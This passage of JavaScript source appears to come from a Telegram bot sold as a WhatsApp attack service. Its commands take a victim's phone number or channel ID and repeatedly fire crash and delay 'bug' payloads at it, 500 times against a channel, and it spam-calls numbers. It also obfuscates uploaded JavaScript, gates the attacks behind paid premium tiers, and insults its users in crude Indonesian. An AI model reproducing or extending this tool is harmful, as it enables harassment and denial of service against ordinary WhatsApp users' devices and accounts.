┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    for (let i = 0; i < 2; i++) { // Kirim 3 kali langsung
        await VampDelayInvis(formatedNumber);
    }

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/f33mbl.jpg", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /trashdelay
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/vampui(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu Goblok!!!");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!! Bukan Premium Mau Access Bot");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /trashui 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /trashbeta 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/f33mbl.jpg", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
        await VampCrashUi(formatedNumber);
        await VampDelayInvis(formatedNumber);
    }

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/f33mbl.jpg", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /trashui
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/vampch(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  // Cek apakah user punya akses premium
  if (!premiumUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!!\nLu Gak ada Hak Gunain Vampire Private");
  }

  // Cek apakah user memasukkan ID saluran
  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Masukkan ID saluran!\nContoh: /trashch id@newsletter");
  }

  let targetChannel = match[1].trim();

  // Eksekusi perintah kirim bug ke channel
  try {
    for (let r = 0; r < 500; r++) {
      await VampChannel(targetChannel);
    }

    bot.sendMessage(chatId, `✅ Pesan dikirim ke saluran *${targetChannel}* sebanyak 20 kali.`);
  } catch (err) {
    console.error("Error saat mengirim ke channel:", err);
    bot.sendMessage(chatId, "❌ Gagal mengirim ke saluran, coba lagi nanti.");
  }
});
bot.onText(/\/encrypthard/, async (msg) => {
    const chatId = msg.chat.id;
    const replyMessage = msg.reply_to_message;

    console.log(`Perintah diterima: /encrypthard dari pengguna: ${msg.from.username || msg.from.id}`);

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return bot.sendMessage(chatId, '😡 Silakan Balas/Tag File .js\nBiar Gua Gak Salah Tolol.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    // Mendapatkan link file
    const fileLink = await bot.getFileLink(fileId);
    const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
    const codeBuffer = Buffer.from(response.data);

    // Simpan file sementara
    const tempFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(tempFilePath, codeBuffer);

    // Enkripsi kode menggunakan JsConfuser
    bot.sendMessage(chatId, "⌛️Sabar...\n Lagi Di Kerjain Sama Trash Encryptnya...");
    const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function () {
            const originalString = "肀TrasheIsBack舀" + "肀TrasheIsBack舀";
            function removeUnwantedChars(input) {
                return input.replace(/[^a-zA-Z肀VampireIsBack舀]/g, '');
            }
            function randomString(length) {
                let result = '';
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                for (let i = 0; i < length; i++) {
                    result += characters.charAt(Math.floor(Math.random() * characters.length));
                }
                return result;
            }
            return removeUnwantedChars(originalString) + randomString(2);
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0.0,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: 1.0,
        shuffle: { hash: 0.0, true: 0.0 },
        stack: true,
        controlFlowFlattening: 1.0,
        opaquePredicates: 0.9,
        deadCode: 0.0,
        dispatcher: true,
        rgf: false,
        calculator: true,
        hexadecimalNumbers: true,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    });

    // Simpan hasil enkripsi
    const encryptedFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(encryptedFilePath, obfuscatedCode);

    // Kirim file terenkripsi ke pengguna
    bot.sendDocument(chatId, encryptedFilePath, {
        caption: `
❒━━━━━━༽𝗦𝘂𝗰𝗰𝗲𝘀𝘀༼━━━━━━❒
┃    - 𝗘𝗻𝗰𝗿𝘆𝗽𝘁 𝗛𝗮𝗿𝗱 𝗝𝘀𝗼𝗻 𝗨𝘀𝗲𝗱 -
┃             -- 𝗧𝗥𝗔𝗦𝗛 𝗕𝗢𝗧 --
❒━━━━━━━━━━━━━━━━━━━━❒`
    });
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !resellerUsers.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Lu Bukan Owner Atau Admin Tolol!!!");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Lu Salah Idiot!!!\nContoh Nih Njing : /addprem 62×××.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Lu Salah Goblok!!!\nContoh Nih Njing : /addprem 62×××.");
  }

  if (!premiumUsers.includes(userId)) {
      premiumUsers.push(userId);
      savePremiumUsers();
      console.log(`${senderId} Added ${userId} To Premium`)
      bot.sendMessage(chatId, `✅ Si Yatim Ini ${userId} Berhasil Mendapatkan Access Premium.`);
  } else {
      bot.sendMessage(chatId, `❌ Si Yatim Ini ${userId} Sudah Menjadi Premium.`);
  }
});
bot.onText(/\/delprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Lu Bukan Admin Atau Owner Tolol!!!");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Lu Salah Idiot!!!\nContoh Nih Njing : /delprem 62×××.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (premiumUsers.includes(userId)) {
      premiumUsers = premiumUsers.filter(id => id !== userId);
      savePremiumUsers();
      console.log(`${senderId} Dihapus ${userId} Dari Premium`)
      bot.sendMessage(chatId, `✅ Si Goblok Ini ${userId} Sudah Dihapus Dari Premium.`);
  } else {
      bot.sendMessage(chatId, `❌ Si Goblok Ini ${userId} Bukan Lagi Premium.`);
  }
});

bot.onText(/\/addowner(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !resellerUsers.includes(senderId) && !superVip.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Lu Ga Punya Access Tolol!!!");
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Lu Salah Idiot!!!\nContoh Nih Njing: /addowner 62×××.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
  if (isNaN(userId)) {
    return bot.sendMessage(chatId, "❌ Lu Salah Goblok!!!\nContoh Nih Njing: /addowner 62×××.");
  }

  if (!OwnerUsers.includes(userId)) {
    OwnerUsers.push(userId);
    saveOwnerUsers(); // Simpan perubahan ke superVip
    console.log(`${senderId} Added ${userId} To Owner`);
    bot.sendMessage(chatId, `✅ Si Yatim Ini ${userId} Berhasil Mendapatkan Access Owner.`);
  } else {
    bot.sendMessage(chatId, `❌ Si Yatim Ini ${userId} Sudah Menjadi Owner.`);
  }
});
bot.onText(/\/delowner(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Cek apakah user yang mengakses punya hak akses
  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !superVip.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Lu Gak Punya Access Tolol!!!");
  }

  // Cek input yang diberikan user
  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Lu Salah Idiot!!!\nContoh Nih Njing: /delowner 62×××.");
  }

  // Ambil ID user dari input dan validasi
  const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
  if (isNaN(userId)) {
    return bot.sendMessage(chatId, "❌ Masukkan ID yang valid.");
  }

  // Cek apakah user yang dimaksud adalah superVip (owner)
  if (OwnerUsers.includes(userId)) {
    // Hapus dari superVip dan simpan perubahan
    OwnerUsers = superVip.filter(id => id !== userId);
    saveOwnerUsers(); // Simpan data terbaru
    console.log(`${senderId} Menghapus ${userId} Dari Owner`);
    bot.sendMessage(chatId, `✅ Si Goblok Ini ${userId} Sudah Dihapus Dari Owner.`);
  } else {
    bot.sendMessage(chatId, `❌ Si Goblok Ini ${userId} Bukan Owner.`);
  }
});
bot.on("callback_query", async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const senderId = callbackQuery.from.id;
    const senderName = callbackQuery.from.username ? `@${callbackQuery.from.username}` : `${senderId}`;
    const [action, formatedNumber] = callbackQuery.data.split(":");

    // Definisi variabel yang belum ada
    let whatsappStatus = true; // Ganti sesuai logic di kode utama
    let getOnlineDuration = () => "1h 23m"; // Placeholder function

    try {
        if (action === "ownermenu") {
            let ligma = `
𖤊───⪩  𝗧𝗥𝗔𝗦𝗛 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 𝗩𝟭.𝟭 𝗣𝗥𝗢  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @SALZz_botz
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
╰──────────────────────╯
╭─────「 𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮 」─────╮
│➵ /addbot <Num>
│➵ /addprem <ID>
│➵ /delprem <ID>
│➵ /addowner <ID>
│➵ /delowner <ID>
╰──────────────────────╯
`;
            bot.sendPhoto(chatId, "https://files.catbox.moe/f33mbl.jpg", {
                caption: ligma,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                                url: "https://t.me/SALZz_botz"
                            }
                        ]
                    ]
                }
            });
        } else if (action === "bugmenu") {
            let ligma = `𖤊───⪩  𝗧𝗥𝗔𝗦𝗛 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 𝗩𝟭.𝟭 𝗣𝗥𝗢  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @SALZz_botz
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
╰──────────────────────╯
╭────── 「 𝐁𝐮𝐠 𝐌𝐞𝐧𝐮 」 ──────╮
│➥ /trashori 62×××
│➥ /trashbeta 62×××
│➥ /trashbussines 62×××
│➥ /trashios 62×××
│➥ /trashdelay 62×××
│➥ /trashui 62×××
╰──────────────────────╯
╭──────「  𝐂𝐡𝐚𝐧𝐧𝐞𝐥  」──────╮
│➢ /trashch <Newsletter>
╰──────────────────────╯
`;
            bot.sendPhoto(chatId, "https://files.catbox.moe/f33mbl.jpg", {
                caption: ligma,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                                url: "https://t.me/SALZz_botz"
                            }
                        ]
                    ]
                }
            });
        } else if (action === "toolsmenu") {
            let ligma = `𖤊───⪩  𝗧𝗥𝗔𝗦𝗛 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 𝗩𝟭.𝟭 𝗣𝗥𝗢  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @SALZz_botz
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
╰──────────────────────╯
╭──────「 𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮 」──────╮
│➩ /fixedbug <Num>
│➩ /encrypthard <Tag File>
│➩ /cooldown <Num>
╰──────────────────────╯
`;
            bot.sendPhoto(chatId, "https://files.catbox.moe/f33mbl.jpg", {
                caption: ligma,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                                url: "https://t.me/SALZz_botz"
                            }
                        ]
                    ]
                }
            });
        } else if (action === "spamcall") {
            await spamcall(formatedNumber);
            await bot.sendMessage(chatId, `✅ Spamming Call to ${formatedNumber}@s.whatsapp.net.`);
        } else {
            bot.sendMessage(chatId, "❌ Unknown action.");
        }

        // Hapus loading di button
        await bot.answerCallbackQuery(callbackQuery.id);
    } catch (err) {
        bot.sendMessage(chatId, `❌ Failed to send bug: ${err.message}`);
    }
});

startWhatsapp()